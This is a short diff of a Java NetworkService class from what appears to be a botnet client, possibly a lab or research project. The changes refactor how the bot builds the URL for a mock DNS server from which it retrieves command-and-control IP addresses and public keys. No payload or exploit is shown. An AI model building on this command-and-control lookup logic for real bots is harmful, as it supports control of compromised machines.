@@ -185,13 +185,13 @@ public class NetworkService {
 	@SuppressWarnings("unchecked")
 	public boolean firstConnectToMockServerDns() {
 
-		String url = "http://" + engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
+		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
 		Pairs<IP, PublicKey> result = new Pairs<IP, PublicKey>();
 		Integer counter = 0;
 
 		while (counter <= AsyncRequest.REQNUMBER) {
 			try {
-				result = asyncRequest.getIpCommandAndControlFromDnsServer(url);
+				result = asyncRequest.getIpCeCFromDnsServer(url);
 				commandConquerIps.addCeC(result);
 				commandConquerIps.getCeCList().forEach(ip -> System.out.println(ip.getValue1()));
 				return Boolean.TRUE;
@@ -261,8 +261,6 @@ public class NetworkService {
 	 * @return
 	 */
 	private String getMyIpCheckInternet() {
-
-		String url = "http://" + engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
 		String result = "";
 		Integer counter = 0;
 		while (true) {
@@ -291,7 +289,7 @@ public class NetworkService {
 	 */
 	public Boolean updateDnsInformation() {
 
-		String url = "http://" + engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
+		String url =  engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
 		Boolean result = false;
 		Integer counter = 0;
 
